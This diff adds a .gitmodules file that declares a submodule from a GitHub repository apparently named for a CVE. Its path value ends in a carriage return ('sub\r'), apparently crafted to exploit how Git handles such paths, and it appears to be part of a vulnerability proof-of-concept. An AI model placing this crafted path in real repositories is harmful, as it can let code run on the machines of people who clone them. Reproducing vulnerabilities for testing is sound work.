@@ -1,0 +1,3 @@
+[submodule "sub"]
+	url = https://github.com/sohaibuddinsyed/ses-repo-cve.git
+	path = "sub\r"
